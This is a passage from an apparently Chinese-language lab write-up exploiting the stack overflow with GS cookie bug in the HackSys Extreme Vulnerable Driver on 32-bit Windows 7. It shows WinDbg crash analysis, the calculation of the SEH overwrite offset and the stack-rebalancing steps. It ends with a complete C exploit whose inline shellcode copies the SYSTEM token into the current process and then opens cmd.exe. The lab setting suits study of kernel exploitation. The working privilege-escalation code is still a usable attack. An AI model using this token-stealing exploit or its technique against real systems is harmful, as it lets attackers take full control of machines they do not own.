traps are. Here is a *portion* of those codes:
If kv shows a taskGate
        use .tss on the part before the colon, then kv.
Else if kv shows a trapframe
        use .trap on that value
Else
        .trap on the appropriate frame will show where the trap was taken
        (on x86, this will be the ebp that goes with the procedure KiTrap)
Endif
kb will then show the corrected stack.
Arguments:
Arg1: 00000008, EXCEPTION_DOUBLE_FAULT
Arg2: 801e6000
Arg3: 00000000
Arg4: 00000000

Debugging Details:
------------------


DUMP_CLASS: 1

DUMP_QUALIFIER: 0

BUILD_VERSION_STRING:  7601.17514.x86fre.win7sp1_rtm.101119-1850

DUMP_TYPE:  0

BUGCHECK_P1: 8

BUGCHECK_P2: ffffffff801e6000

BUGCHECK_P3: 0

BUGCHECK_P4: 0

BUGCHECK_STR:  0x7f_8

TSS:  00000028 -- (.tss 0x28)
eax=83844000 ebx=00000000 ecx=83845150 edx=00000008 esi=00000000 edi=87f9bd48
eip=83f1d4f8 esp=83844d04 ebp=838450b0 iopl=0         nv up ei ng nz ac po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292
nt!KeBugCheck2+0x11:
83f1d4f8 89442428        mov     dword ptr [esp+28h],eax ss:0010:83844d2c=????????
Resetting default scope

CPU_COUNT: 4

CPU_MHZ: af8

CPU_VENDOR:  GenuineIntel

CPU_FAMILY: 6

CPU_MODEL: 9e

CPU_STEPPING: 9

CPU_MICROCODE: 6,9e,9,0 (F,M,S,R)  SIG: 8E'00000000 (cache) 8E'00000000 (init)

DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT

PROCESS_NAME:  StackBufferOverflow.exe

CURRENT_IRQL:  2

ANALYSIS_SESSION_HOST:  LAPTOP-TLRU764L

ANALYSIS_SESSION_TIME:  05-21-2020 12:56:29.0237

ANALYSIS_VERSION: 10.0.16299.15 amd64fre

TRAP_FRAME:  83846944 -- (.trap 0xffffffff83846944)
ErrCode = 00000010
eax=00000000 ebx=00000000 ecx=66616168 edx=83eb6636 esi=00000000 edi=00000000
eip=66616168 esp=838469b8 ebp=838469d8 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
66616168 ??              ???
Resetting default scope

EXCEPTION_RECORD:  83847040 -- (.exr 0xffffffff83847040)
ExceptionAddress: 66616168 //崩溃时跳转到0x66616168处
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000010
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 66616168
Attempt to execute non-executable address 66616168

```

所以SEH的偏移为：

```
cyclic -c i386 -l 0x66616168
528
```

## 完成exp

这里也需要平衡堆栈，因为是通过SEH劫持控制流到shellcode，最好是直接返回到`HEVD!IrpDeviceIoCtlHandler`函数

```
1: kd> kp
 # ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 8fb7f128 83e905f4 0xfa1075
01 8fb7f14c 83ec43b5 nt!ExecuteHandler+0x24
02 8fb7f1e0 83ecd05c nt!RtlDispatchException+0xb6
03 8fb7f774 83e56dd6 nt!KiDispatchException+0x17c
04 8fb7f7dc 83e56d8a nt!CommonDispatchException+0x4a
05 8fb7f860 9a9daa0f nt!KiExceptionExit+0x192
06 8fb7fab0 9a9da8b6 HEVD!TriggerBufferOverflowStackGS(void * UserBuffer = 0x000d0dec, unsigned long Size = 0x218)+0x13f [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\bufferoverflowstackgs.c @ 107] 
07 8fb7fad4 9a9daee5 HEVD!BufferOverflowStackGSIoctlHandler(struct _IRP * Irp = 0x88165dc8, struct _IO_STACK_LOCATION * IrpSp = 0x88165e38 IRP_MJ_DEVICE_CONTROL / 0x0 for Device for "\Driver\HEVD")+0x76 [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\bufferoverflowstackgs.c @ 144] 
08 8fb7fafc 83e4f593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x884fc4c8 Device for "\Driver\HEVD", struct _IRP * Irp = 0x88165dc8)+0xf5 [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\hacksysextremevulnerabledriver.c @ 281] 
09 8fb7fb14 8404399f nt!IofCallDriver+0x63
0a 8fb7fb34 84046b71 nt!IopSynchronousServiceTail+0x1f8
0b 8fb7fbd0 8408d3f4 nt!IopXxxControlFile+0x6aa
0c 8fb7fc04 83e561ea nt!NtDeviceIoControlFile+0x2a
0d 8fb7fc04 775b70b4 nt!KiFastCallEntry+0x12a
0e 0022f6d0 775b5864 ntdll!KiFastSystemCallRet
0f 0022f6d4 7595989d ntdll!ZwDeviceIoControlFile+0xc
10 0022f734 75afa671 KernelBase!DeviceIoControl+0xf6
11 0022f760 00fa1149 kernel32!DeviceIoControlImplementation+0x80
12 0022f798 00fa131a 0xfa1149
13 0022f7e0 75b03c45 0xfa131a
14 0022f7ec 775d37f5 kernel32!BaseThreadInitThunk+0xe
15 0022f82c 775d37c8 ntdll!__RtlUserThreadStart+0x70
16 0022f844 00000000 ntdll!_RtlUserThreadStart+0x1b
1: kd> r
eax=00000000 ebx=00000000 ecx=00fa1040 edx=83e90636 esi=00000000 edi=00000000
eip=00fa1075 esp=8fb7f0fc ebp=8fb7f128 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
00fa1075 83c420          add     esp,20h
1: kd> ? 8fb7fad4 - esp
Evaluate expression: 2520 = 000009d8

```

所以`add esp 0x9d8`即可。但是还是会出现异常，看了一下，是由于需要将edi、esi、ebx三个寄存器的值予以恢复，如下，在`HEVD!TriggerBufferOverflowStackGS`返回前，pop了ecx、edi、esi、ebx四个寄存器，而ecx是存储cookie的。

```
8d85ea6d 59              pop     ecx
8d85ea6e 5f              pop     edi
8d85ea6f 5e              pop     esi
8d85ea70 5b              pop     ebx
8d85ea71 8b4de4          mov     ecx,dword ptr [ebp-1Ch]
8d85ea74 33cd            xor     ecx,ebp
8d85ea76 e8d5b5fbff      call    HEVD!__security_check_cookie (8d81a050)
8d85ea7b 8be5            mov     esp,ebp
8d85ea7d 5d              pop     ebp

```

堆栈情况如下：

```
1: kd> dd esp
834ab878  883747e0 8816dda8 00000000 000000b0
834ab888  00000001 00000000 00000000 61616161
834ab898  00000000 00000000 00000000 00000000
834ab8a8  00000000 00000000 00000000 00000000
834ab8b8  00000000 00000000 00000000 00000000
834ab8c8  00000000 00000000 00000000 00000000
834ab8d8  00000000 00000000 00000000 00000000
834ab8e8  00000000 00000000 00000000 00000000
1: kd> kp
 # ChildEBP RetAddr  
00 834abab0 8d85e8b6 HEVD!TriggerBufferOverflowStackGS(void * UserBuffer = 0x01202190, unsigned long Size = 4)+0x19e 
01 834abad4 8d85eee5 HEVD!BufferOverflowStackGSIoctlHandler(struct _IRP * Irp = 0x86ac9e78, struct _IO_STACK_LOCATION * IrpSp = 0x86ac9ee8 IRP_MJ_DEVICE_CONTROL / 0x0 for {...})+0x76 
02 834abafc 83e82593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x8816dda8 Device for "\Driver\HEVD", struct _IRP * Irp = 0x86ac9e78)+0xf5 
03 834abb14 8407699f nt!IofCallDriver+0x63
04 834abb34 84079b71 nt!IopSynchronousServiceTail+0x1f8

```

在我们的shellcode执行到返回前时，堆栈中某处的情况如下：

```
2: kd> dd 8345bafc - 284
8345b878  87fd3e08 8816dda8 00000000 000000b0
8345b888  00000001 00000000 00000000 00c71040
8345b898  00c71040 00c71040 00c71040 00c71040
8345b8a8  00c71040 00c71040 00000003 00000004
8345b8b8  00c7107b 00000000 00c7107b 00000003
8345b8c8  8345b9f0 83efff57 8345b9b4 83efff5f
8345b8d8  b702a4a9 00c7107b 00000000 00c7107b
8345b8e8  00c71040 00c71040 00c71040 00c71040

```

也就是

```
					 add esp, 0x9d8
					 mov edi, [esp-0x284]
					 mov esi, [esp-0x280]
					 mov ebx, [esp-0x27c]
					 pop ebp
```

因此完整的shellcode如下：

```c
#include<stdio.h>
#include<windows.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
#define FILEMAP_SIZE 0x1000
#define BUF_SIZE 532

void ShellcodeGS()
{
	//__debugbreak();
	_asm
	{
		pushad
		mov eax, fs:[124h]
		mov eax, [eax + 0x50]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0xb8]
					 sub eax, 0xb8
					 cmp[eax + 0xb4], edx
					 jnz find_sys_pid

					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 add esp, 0x9d8
					 mov edi, [esp-0x25c]
					 mov esi, [esp-0x258]
					 mov ebx, [esp-0x254]
					 pop ebp
					 ret 8
	}
}
static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main() {
	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
	LPCWSTR lpSharedMemoryMap = L"Local\\SharedMemoryMap";
	LPVOID pBuf = NULL;
	LPVOID lpOverflowBuffer;
	//CHAR pattern[] = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaaf";
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("cannot open i/o device");
		return false;
	}

	HANDLE hMapFile = CreateFileMapping(
		INVALID_HANDLE_VALUE,	// Use paging file
		NULL,					// Default security
		PAGE_EXECUTE_READWRITE, // RWX
		0,						// 大端
		FILEMAP_SIZE,			// 小端
		lpSharedMemoryMap);
	
	if (hMapFile == NULL) {
		printf("cannot open i/o device");
	}

	pBuf = MapViewOfFile(
		hMapFile,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		FILEMAP_SIZE);

	if (pBuf == NULL) {
		CloseHandle(hMapFile);
	}
	//memcpy(pBuf, pattern, FILEMAP_SIZE);
	memset(pBuf, 0x41, FILEMAP_SIZE);
	lpOverflowBuffer = (LPVOID)((ULONG)pBuf + (FILEMAP_SIZE - BUF_SIZE));
	
	for (unsigned int i = 0; i < BUF_SIZE; i += 4) // Fill Buffer with Payload address to overwrite the SEH Handler
		*(PDWORD)((ULONG)lpOverflowBuffer + i) = (DWORD)&ShellcodeGS;
	
	//memcpy(lpOverflowBuffer, pattern, sizeof(pattern));
	DWORD recvBuf;
	// allocate memory in non_paged pool
	DeviceIoControl(hDevice,                       // device to be queried
		HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
		lpOverflowBuffer, BUF_SIZE + 4,
		//"aaaa", 4,
		//pBuf, FILEMAP_SIZE + 4,
		NULL, 0,
		&recvBuf,                         // # bytes returned
		NULL);          // synchronous I/O
	
	CreateCmd();
	return 0;
}
```





















